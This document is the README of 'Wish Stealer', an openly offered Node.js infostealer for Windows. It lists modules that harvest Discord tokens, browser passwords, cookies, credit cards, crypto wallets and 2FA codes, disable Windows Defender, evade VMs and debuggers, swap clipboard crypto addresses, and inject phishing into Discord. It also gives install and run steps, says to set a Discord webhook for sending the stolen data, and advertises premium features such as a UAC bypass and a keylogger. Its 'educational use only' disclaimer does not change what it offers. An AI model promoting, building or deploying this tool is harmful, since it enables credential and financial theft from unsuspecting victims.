[shield-github-issues]: https://img.shields.io/github/issues/k4itrun/wish?style=for-the-badge&color=dc67ff
[shield-github-license]: https://img.shields.io/github/license/k4itrun/wish?style=for-the-badge&color=dc67ff
[shield-github-stars]: https://img.shields.io/github/stars/k4itrun/wish?style=for-the-badge&color=dc67ff
[shield-github-forks]: https://img.shields.io/github/forks/k4itrun/wish?style=for-the-badge&color=dc67ff

[github-assets-img-config-link]: .github/assets/config.png

[github-assets-img-browsers-link]: .github/assets/browsers.png
[github-assets-img-commonfiles-link]: .github/assets/commonfiles.png
[github-assets-img-games-link]: .github/assets/games.png
[github-assets-img-discordinjection-link]: .github/assets/discordinjection.png
[github-assets-img-socials-link]: .github/assets/socials.png
[github-assets-img-codes-link]: .github/assets/codes.png
[github-assets-img-system-link]: .github/assets/system.png
[github-assets-img-tokens-link]: .github/assets/tokens.png
[github-assets-img-vpns-link]: .github/assets/vpns.png
[github-assets-img-wallets-link]: .github/assets/wallets.png
[github-assets-img-wish-link]: .github/assets/wish.png
[github-assets-img-files-link]: .github/assets/files.png

[github-issues-link]: https://github.com/k4itrun/wish/issues
[github-license-link]: https://github.com/k4itrun/wish/blob/main/license
[github-stars-link]: https://github.com/k4itrun/wish/stargazers
[github-forks-link]: https://github.com/k4itrun/wish/network/members

[github-link]: https://github.com/k4itrun/wish
[discord-server-link]: https://discord.gg/QFU52q5QCR

<div align="center">

<img src=".github/assets/avatar.png" width=100 alt="Aurita"/><br/>

[![][shield-github-issues]][github-issues-link]
[![][shield-github-license]][github-license-link]
[![][shield-github-stars]][github-stars-link]
[![][shield-github-forks]][github-forks-link]<br/>

# [@Wish Stealer][github-link]
Node.js malware for Windows that steals data from Discord, browsers, and crypto wallets, affecting all users.

</div>

## Table of Contents
1. [Overview](#overview)
   - [Features](#features)
2. [Getting Started](#getting-started)
   - [Requirements](#requirements)
   - [Installation](#installation)
3. [Usage](#usage)
4. [Preview](#preview)
      - [Premium Features](#premium-features)
      - [Star History](#star-history)
5. [Uninstalling](#uninstalling)
6. [Acknowledgments](#acknowledgments)
7. [Contributing](#contributing)
8. [Contact](#contact)
9. [License](#license)
10. [Disclaimer](#disclaimer)

## Overview
The most comprehensive open-source stealer based on Node.js available on GitHub. This Discord stealer utilizes a privilege escalation technique to gain access to all user sessions on Windows.

- If you're wondering where the previous "AuraThemes" repository was, it was simply abandoned by the creation of this new one.

### Features
- [Development][github-link]
   - Clean and efficient code.
   - Up-to-date dependencies.
   - Minimal reliance on external Node.js libraries.
- [Modules][github-link]
   - [antidebug](src/modules/antidebug/antidebug.js): Terminates debugging tools (incomplete).
   - [antivirus](src/modules/antivirus/antivirus.js): Disables Windows Defender and blocks antivirus websites.
   - [antivm](src/modules/antivm/antivm.js): Terminates if running in a virtual machine.
   - [browsers](src/modules/browsers/browsers.js): 
      - Captures logins, cookies, credit cards, bookmarks, autofills, history, and downloads from 37 Chromium-based browsers.
      - Captures logins, cookies, history, bookmarks, and downloads from 10 Gecko/Firefox browsers.
   - [clipper](src/modules/clipper/clipper.js): Monitors clipboard for crypto addresses and replaces them with predefined ones.
   - [commonfiles](src/modules/commonfiles/commonfiles.js): Collects sensitive files from common directories.
   - [fakerror](src/modules/fakeerror/fakeerror.js): Misleads the user into thinking the program has crashed.
   - [games](src/modules/games/games.js): Extracts sessions from various game launchers, including Epic Games, Uplay, Minecraft, and Riot Games.
   - [hideconsole](src/modules/hideconsole/hideconsole.js): Conceals the console.
   - [injections](src/modules/injections): Injects into Discord and wallets to capture private information.
      - [discord](src/modules/injections/discord/discord.js):
         - Captures login, registration, and 2FA requests.
         - Captures email/password changes and backup code requests.
         - Blocks QR code logins and device views.
         - Phishing mode simulates alerts to trick victims into changing their email.
   - [killprocess](src/modules/killprocess/killprocess.js): Terminates processes.
   - [socials](src/modules/socials/socials.js): Manages social media files.
   - [startup](src/modules/startup/startup.js): Ensures the program starts with the system.
   - [stealcodes](src/modules/stealcodes/stealcodes.js): Captures 2FA codes from Discord, GitHub, Google, and more.
   - [system](src/modules/system/system.js): Gathers information on IP address, CPU, GPU, RAM, location, and saved Wi-Fi networks.
   - [tokens](src/modules/tokens/tokens.js): Harvests tokens from four Discord apps and various browsers.
   - [vpns](src/modules/vpns/vpns.js): Collects VPN data.
   - [wallets](src/modules/wallets/wallets.js): Captures wallet information.
  
## Getting Started

### Requirements
#### Install Node.js LTS
- ` Download Node.js ` Visit the official <a href="https://nodejs.org/en" target="_blank">Node.js LTS page</a> to download the Long-Term Support (LTS) version.

#### Install the Visual C++ Build Environment
- ` For Visual Studio 2019 or later ` Install the `Desktop development with C++` workload via <a href="https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=Community" target="_blank">Visual Studio Community</a>.
- ` For versions earlier than Visual Studio 2019 ` Use the <a href="https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=BuildTools" target="_blank">Visual Studio Build Tools</a> and select the `Visual C++ build tools` option during installation.

#### Hardware
JavaScript, in its native form, lacks direct control over hardware. Therefore, this project relies on modules that utilize `C++`, which does provide direct access to hardware components. By leveraging the [node-gyp](https://github.com/nodejs/node-gyp) library, I can interface with `C++` and perform operations that JavaScript cannot accomplish directly.

to correctly install node-gyp go to its repo: [node-gyp](https://github.com/nodejs/node-gyp?tab=readme-ov-file#on-windows)

### Installation
1. Follow these steps to have it or watch the video <a href="https://www.youtube.com/watch?v=_Kfq557P0n4" target="_blank">YouTube!</a>

2. Install [Git](https://git-scm.com/) and then use these commands in the console.
```bash
git clone https://github.com/k4itrun/wish.git
```
```bash
cd wish/src/
```
```bash
npm install
```

3. Edit `config.js` for your Discord webhook and crypto addresses.
![][github-assets-img-config-link]

## Usage
1. This project can be started by running the command
```bash
npm run start or node index
```

2. but if you are thinking of creating an executable you can choose to use **(`electron-builder`, `pkg`, etc...)**

## Preview
![][github-assets-img-system-link]
![][github-assets-img-browsers-link]
![][github-assets-img-games-link]
![][github-assets-img-commonfiles-link]
![][github-assets-img-codes-link]
![][github-assets-img-tokens-link]
![][github-assets-img-wallets-link]
![][github-assets-img-vpns-link]
![][github-assets-img-socials-link]
![][github-assets-img-discordinjection-link]
![][github-assets-img-wish-link]
![][github-assets-img-files-link]

### Premium Features
- **Marked features**: Premium  
   - [ ] Upload files
   - [ ] Update/Reinstall Bypass
   - [ ] File/session theft
   - [ ] Clipper Wallets
   - [ ] Launcher Stealer
   - [ ] VPN and Messenger Stealers
   - [x] Extension Injection
   - [x] UAC Bypass
   - [x] Wallet Injection
   - [x] Email Injection
   - [x] Keylogger Integration
   - [x] Discord Injection (Force 2FA disabled)
   - [x] Builder, Discord Bot and API

### Star History
<a href="https://star-history.com/#k4itrun/wish&Timeline">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=k4itrun/wish&type=Timeline&theme=dark" />
    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=k4itrun/wish&type=Timeline" />
    <img alt="Star History Wish St34l3r" src="https://api.star-history.com/svg?repos=k4itrun/wish&type=Timeline" />
  </picture>
</a>

## Uninstalling
1. Open PowerShell as Administrator.

2. Terminate processes:
```bash
taskkill /f /t /im Wish.exe
taskkill /f /t /im WindowsSecurityHealthService.exe
```

3. Remove from startup:
```bash
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Security Health Service P" /f
```

## Acknowledgments
This project draws inspiration from various infostealers. Special thanks to:
- [Stealerium](https://github.com/Stealerium/Stealerium): Based on clipper and keylogging, with plans for future versions.
- [hackirby](https://github.com/hackirby/skuld): Features decryption and code organization functions.
- [addi00000](https://github.com/addi00000/empyrean): Includes browser-related embed customizations.
- [can-kat](https://github.com/can-kat/cstealer/blob/main/cstealer.py): Focuses on extensions and wallet path detection.

## Contributing
Suggestions and contributions are welcome! See the [CONTRIBUTING.md](CONTRIBUTING.md) for details.

## Contact
For inquiries, reach out at [contact@w1sh.xyz](mailto:contact@w1sh.xyz) or join our [Discord Server][discord-server-link].

## License
This software is licensed under the [MIT License](LICENSE).

## Disclaimer
### Essential Advisory: This tool is for educational use only.
This tool is intended for educational purposes only. Misuse will not be supported, and by using it, you agree to these terms.

### User Accountability:
By using this tool, you accept full responsibility for your actions. Misuse of this software is prohibited, and the creator disclaims any liability. Ensure your usage complies with all relevant laws.

### No Assistance:
The creator will not provide support or address misuse. Inquiries related to harmful use will be ignored.

### Terms Acceptance:
By using this tool, you agree to this disclaimer. If you do not agree, refrain from using the software.